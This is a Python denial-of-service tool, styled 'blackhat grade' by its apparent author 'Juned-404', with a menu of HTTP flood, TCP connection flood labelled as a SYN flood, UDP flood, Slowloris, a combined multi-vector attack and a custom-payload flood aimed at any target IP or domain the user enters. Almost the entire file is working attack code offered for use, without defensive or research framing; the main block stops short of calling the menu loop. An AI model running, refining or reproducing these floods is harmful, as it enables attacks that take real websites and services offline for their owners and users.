#!/usr/bin/env python3
"""
JUNED-404 ULTIMATE DDOS TOOL - FIXED VERSION
Blackhat Grade Distributed Denial of Service
Created by Juned-404 - No Rules, No Limits
"""

import socket
import threading
import time
import random
import sys
import os
import urllib.request
import urllib.parse
import ssl
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urlparse

class Juned404DDOS:
    def __init__(self):
        self.attack_running = False
        self.stats = {
            'packets_sent': 0,
            'targets_hit': 0,
            'start_time': 0
        }
        
    def show_banner(self):
        banner = r"""
╔═══╗░░╔╗░░░░░░╔╗░░░░╔═══╗░░╔╗░░░░░╔╗
║╔══╝░░║║░░░░░░║║░░░░║╔══╝░░║║░░░░░║║
║╚══╦══╣║╔══╦═╗║║╔╗░░║╚══╦══╣║╔══╦═╝║
║╔══╣╔╗║║║╔╗║╔╗╣╚╝╝░░║╔══╣╔╗║║║╔╗║╔╗║
║║░░║╚╝║╚╣╚╝║║║║╔╗╗░░║╚══╣╚╝║╚╣╚╝║╚╝║
╚╝░░╚══╩═╩══╩╝╚╩╝╚╝░░╚═══╩══╩═╩══╩══╝
        
██████╗░██████╗░░█████╗░██████╗░
╚════██╗██╔══██╗██╔══██╗██╔══██╗
░░███╔═╝██║░░██║██║░░██║██████╔╝
██╔══╝░░██║░░██║██║░░██║██╔══██╗
███████╗██████╔╝╚█████╔╝██║░░██║
╚══════╝╚═════╝░░╚════╝░╚═╝░░╚═╝
        
▄︻デ══━一  JUNED-404 ULTIMATE DDOS  ╾━╤デ︻▄
        """
        print(banner)
        print("🔥 BLACKHAT GRADE DISTRIBUTED DENIAL OF SERVICE")
        print("🔰 Created by Juned-404 - No Rules, No Limits")
        print("⏰ " + time.strftime("%Y-%m-%d %H:%M:%S"))
        print("=" * 60)

    def show_menu(self):
        menu = """
╔══════════════════════════════════════════════╗
║               JUNED-404 DDOS MENU            ║
╠══════════════════════════════════════════════╣
║ 1. HTTP FLOOD ATTACK                         ║
║ 2. TCP SYN FLOOD ATTACK                      ║
║ 3. UDP FLOOD ATTACK                          ║
║ 4. SLOWLORIS ATTACK                          ║
║ 5. MIXED MULTI-VECTOR ATTACK                 ║
║ 6. CUSTOM PAYLOAD ATTACK                     ║
║ 7. SHOW STATISTICS                           ║
║ 8. STOP ALL ATTACKS                          ║
║ 0. EXIT                                      ║
╚══════════════════════════════════════════════╝
        """
        print(menu)

    def generate_user_agent(self):
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]
        return random.choice(user_agents)

    def resolve_target(self, target):
        """Resolve domain to IP address"""
        try:
            # Remove protocol if present
            if '://' in target:
                target = target.split('://')[1]
            # Remove path and port
            target = target.split('/')[0].split(':')[0]
            
            ip = socket.gethostbyname(target)
            return ip
        except:
            return target

    def http_flood(self, target, port=80, threads=100, duration=60):
        """HTTP Flood Attack - Overwhelms web servers with HTTP requests"""
        self.attack_running = True
        self.stats['start_time'] = time.time()
        target_ip = self.resolve_target(target)
        
        def attack_thread(thread_id):
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target_ip, port))
                    
                    # Craft malicious HTTP requests
                    payloads = [
                        f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.generate_user_agent()}\r\nAccept: */*\r\n\r\n",
                        f"POST / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.generate_user_agent()}\r\nContent-Length: 1000\r\n\r\n" + "X" * 1000,
                        f"GET /?{random.randint(1000, 9999)} HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {self.generate_user_agent()}\r\n\r\n"
                    ]
                    
                    for payload in payloads:
                        try:
                            sock.send(payload.encode())
                            self.stats['packets_sent'] += 1
                        except:
                            break
                    
                    sock.close()
                    
                except Exception as e:
                    pass
                
                time.sleep(0.01)
        
        print(f"🔥 Starting HTTP Flood on {target}:{port}")
        print(f"🎯 Threads: {threads} | Duration: {duration}s")
        print(f"📍 Resolved IP: {target_ip}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack_thread, i) for i in range(threads)]
            
            for future in futures:
                try:
                    future.result()
                except:
                    pass

    def syn_flood(self, target, port=80, threads=200, duration=60):
        """TCP SYN Flood - Exhausts target's connection queue"""
        self.attack_running = True
        self.stats['start_time'] = time.time()
        target_ip = self.resolve_target(target)
        
        def attack_thread(thread_id):
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    # Use regular sockets for compatibility
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect((target_ip, port))
                    # Immediately close to simulate SYN flood effect
                    sock.close()
                    self.stats['packets_sent'] += 1
                    
                except:
                    # Connection failed (which is expected in SYN flood)
                    self.stats['packets_sent'] += 1
                
                time.sleep(0.001)
        
        print(f"💀 Starting SYN Flood on {target}:{port}")
        print(f"🎯 Threads: {threads} | Duration: {duration}s")
        print(f"📍 Resolved IP: {target_ip}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack_thread, i) for i in range(threads)]
            
            for future in futures:
                try:
                    future.result()
                except:
                    pass

    def udp_flood(self, target, port=53, threads=150, duration=60, packet_size=1024):
        """UDP Flood - Overwhelms target with UDP packets"""
        self.attack_running = True
        self.stats['start_time'] = time.time()
        target_ip = self.resolve_target(target)
        
        def attack_thread(thread_id):
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    
                    # Generate random payload
                    payload = os.urandom(packet_size)
                    
                    sock.sendto(payload, (target_ip, port))
                    self.stats['packets_sent'] += 1
                    sock.close()
                    
                except Exception as e:
                    pass
                
                time.sleep(0.001)
        
        print(f"🌪️ Starting UDP Flood on {target}:{port}")
        print(f"🎯 Threads: {threads} | Packet Size: {packet_size} | Duration: {duration}s")
        print(f"📍 Resolved IP: {target_ip}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack_thread, i) for i in range(threads)]
            
            for future in futures:
                try:
                    future.result()
                except:
                    pass

    def slowloris_attack(self, target, port=80, sockets_count=200, duration=120):
        """Slowloris Attack - Keeps many connections open with slow headers"""
        self.attack_running = True
        self.stats['start_time'] = time.time()
        target_ip = self.resolve_target(target)
        
        def create_slowloris_socket(socket_id):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((target_ip, port))
                
                # Send partial headers
                sock.send(f"GET /{socket_id} HTTP/1.1\r\nHost: {target}\r\n".encode())
                self.stats['packets_sent'] += 1
                return sock
            except:
                return None
        
        sockets = []
        
        try:
            # Create multiple connections
            print(f"🐌 Starting Slowloris on {target}:{port}")
            print(f"🎯 Sockets: {sockets_count} | Duration: {duration}s")
            print(f"📍 Resolved IP: {target_ip}")
            
            for i in range(sockets_count):
                if not self.attack_running:
                    break
                    
                sock = create_slowloris_socket(i)
                if sock:
                    sockets.append(sock)
                time.sleep(0.1)
            
            # Keep connections alive
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                for sock in sockets[:]:
                    try:
                        # Send keep-alive headers slowly
                        sock.send(f"X-a: {random.randint(1000, 9999)}\r\n".encode())
                        time.sleep(15)
                    except:
                        sockets.remove(sock)
                        # Try to recreate socket
                        new_sock = create_slowloris_socket(len(sockets))
                        if new_sock:
                            sockets.append(new_sock)
                        
        finally:
            # Cleanup
            for sock in sockets:
                try:
                    sock.close()
                except:
                    pass

    def mixed_attack(self, target, duration=90):
        """Multi-vector mixed attack for maximum impact"""
        print(f"⚡ Starting MIXED Multi-Vector Attack on {target}")
        print("🚀 Deploying: HTTP Flood + UDP Flood + Slowloris")
        
        target_ip = self.resolve_target(target)
        print(f"📍 Resolved IP: {target_ip}")
        
        self.attack_running = True
        self.stats['start_time'] = time.time()
        
        threads = []
        
        # Start HTTP Flood
        t1 = threading.Thread(target=self.http_flood, args=(target, 80, 50, duration))
        t1.daemon = True
        threads.append(t1)
        
        # Start UDP Flood  
        t2 = threading.Thread(target=self.udp_flood, args=(target, 53, 75, duration))
        t2.daemon = True
        threads.append(t2)
        
        # Start Slowloris
        t3 = threading.Thread(target=self.slowloris_attack, args=(target, 80, 100, duration))
        t3.daemon = True
        threads.append(t3)
        
        for t in threads:
            t.start()
            
        # Wait for duration or until stopped
        end_time = time.time() + duration
        while time.time() < end_time and self.attack_running:
            time.sleep(1)
            
        self.attack_running = False

    def custom_payload_attack(self, target, port=80, payload="", threads=100, duration=60):
        """Custom payload attack"""
        if not payload:
            payload = "GET / HTTP/1.1\r\nHost: {target}\r\n\r\n"
            
        self.attack_running = True
        self.stats['start_time'] = time.time()
        target_ip = self.resolve_target(target)
        
        def attack_thread(thread_id):
            end_time = time.time() + duration
            while time.time() < end_time and self.attack_running:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(5)
                    sock.connect((target_ip, port))
                    
                    formatted_payload = payload.format(target=target, thread=thread_id)
                    sock.send(formatted_payload.encode())
                    self.stats['packets_sent'] += 1
                    
                    sock.close()
                    
                except Exception as e:
                    pass
                
                time.sleep(0.01)
        
        print(f"💀 Starting Custom Payload Attack on {target}:{port}")
        print(f"🎯 Threads: {threads} | Duration: {duration}s")
        print(f"📍 Resolved IP: {target_ip}")
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = [executor.submit(attack_thread, i) for i in range(threads)]
            
            for future in futures:
                try:
                    future.result()
                except:
                    pass

    def show_stats(self):
        """Display attack statistics"""
        if self.stats['start_time'] == 0:
            print("❌ No active attacks running")
            return
            
        duration = time.time() - self.stats['start_time']
        packets_per_second = self.stats['packets_sent'] / duration if duration > 0 else 0
        
        stats_display = f"""
╔══════════════════════════════════════════════╗
║               ATTACK STATISTICS              ║
╠══════════════════════════════════════════════╣
║ 📊 Packets Sent: {self.stats['packets_sent']:>20,} ║
║ ⏱️  Duration: {duration:8.1f} seconds{'':>15} ║
║ 🚀 Packets/Second: {packets_per_second:8.1f}{'':>15} ║
║ 🎯 Targets Hit: {self.stats['targets_hit']:>20} ║
║ 🔥 Status: {'RUNNING' if self.attack_running else 'STOPPED':>22} ║
╚══════════════════════════════════════════════╝
        """
        print(stats_display)

    def stop_attacks(self):
        """Stop all running attacks"""
        self.attack_running = False
        print("🛑 All attacks stopped!")
        self.show_stats()

    def run(self):
        """Main execution loop"""
        self.show_banner()
        
        while True:
            self.show_menu()
            try:
                choice = input("\n🔪 Select attack method [0-8]: ").strip()
            except KeyboardInterrupt:
                print("\n👋 Exiting...")
                break
                
            if choice == '0':
                print("👋 Exiting Juned-404 DDoS Tool...")
                break
                
            elif choice == '1':
                try:
                    target = input("🎯 Enter target IP/domain: ").strip()
                    if not target:
                        print("❌ Target cannot be empty!")
                        continue
                    threads = int(input("🧵 Enter threads (50-500) [100]: ") or "100")
                    duration = int(input("⏰ Enter duration (seconds) [60]: ") or "60")
                    self.http_flood(target, 80, threads, duration)
                except ValueError:
                    print("❌ Invalid input! Please enter numbers for threads and duration.")
                except Exception as e:
                    print(f"❌ Error: {e}")
                
            elif choice == '2':
                try:
                    target = input("🎯 Enter target IP: ").strip()
                    if not target:
                        print("❌ Target cannot be empty!")
                        continue
                    threads = int(input("🧵 Enter threads (100-1000) [200]: ") or "200")
                    duration = int(input("⏰ Enter duration (seconds) [60]: ") or "60")
                    self.syn_flood(target, 80, threads, duration)
                except ValueError:
                    print("❌ Invalid input!")
                except Exception as e:
                    print(f"❌ Error: {e}")
                
            elif choice == '3':
                try:
                    target = input("🎯 Enter target IP: ").strip()
                    if not target:
                        print("❌ Target cannot be empty!")
                        continue
                    threads = int(input("🧵 Enter threads (100-500) [150]: ") or "150")
                    duration = int(input("⏰ Enter duration (seconds) [60]: ") or "60")
                    packet_size = int(input("📦 Enter packet size (bytes) [1024]: ") or "1024")
                    self.udp_flood(target, 53, threads, duration, packet_size)
                except ValueError:
                    print("❌ Invalid input!")
                except Exception as e:
                    print(f"❌ Error: {e}")
                
            elif choice == '4':
                try:
                    target = input("🎯 Enter target IP/domain: ").strip()
                    if not target:
                        print("❌ Target cannot be empty!")
                        continue
                    sockets = int(input("🔗 Enter socket count (50-500) [200]: ") or "200")
                    duration = int(input("⏰ Enter duration (seconds) [120]: ") or "120")
                    self.slowloris_attack(target, 80, sockets, duration)
                except ValueError:
                    print("❌ Invalid input!")
                except Exception as e:
                    print(f"❌ Error: {e}")
                
            elif choice == '5':
                try:
                    target = input("🎯 Enter target IP/domain: ").strip()
                    if not target:
                        print("❌ Target cannot be empty!")
                        continue
                    duration = int(input("⏰ Enter duration (seconds) [90]: ") or "90")
                    self.mixed_attack(target, duration)
                except ValueError:
                    print("❌ Invalid input!")
                except Exception as e:
                    print(f"❌ Error: {e}")
                
            elif choice == '6':
                try:
                    target = input("🎯 Enter target IP/domain: ").strip()
                    if not target:
                        print("❌ Target cannot be empty!")
                        continue
                    port = int(input("🔌 Enter port [80]: ") or "80")
                    custom_payload = input("💀 Enter custom payload (use {target} for target, {thread} for thread ID): ").strip()
                    threads = int(input("🧵 Enter threads [100]: ") or "100")
                    duration = int(input("⏰ Enter duration (seconds) [60]: ") or "60")
                    self.custom_payload_attack(target, port, custom_payload, threads, duration)
                except ValueError:
                    print("❌ Invalid input!")
                except Exception as e:
                    print(f"❌ Error: {e}")
                
            elif choice == '7':
                self.show_stats()
                
            elif choice == '8':
                self.stop_attacks()
                
            else:
                print("❌ Invalid choice! Please select 0-8")
            
            input("\nPress Enter to continue...")
            os.system('cls' if os.name == 'nt' else 'clear')

if __name__ == "__main__":
    # Check if running as root for raw socket operations
    if os.name != 'nt' and os.geteuid() != 0:
        print("⚠️  Warning: Some features may require root privileges")
    
    
